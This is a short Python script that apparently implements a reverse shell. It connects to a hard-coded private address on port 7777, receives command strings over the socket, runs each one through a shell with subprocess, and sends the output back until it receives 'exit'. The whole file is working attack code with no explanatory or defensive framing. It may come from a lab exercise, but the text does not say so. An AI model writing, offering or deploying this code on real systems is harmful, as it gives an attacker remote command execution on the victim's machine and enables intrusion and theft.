#!/usr/bin/python

import socket
import subprocess

def shell():
    while True:
        cmd = s.recv(1024).decode('utf-8') # receive command from server
        if cmd == "exit":
            break
        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output) #send output to server

#socket creation
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect
s.connect(("192.168.92.128",7777)) #server IP and to which port to connect to
shell()
s.close()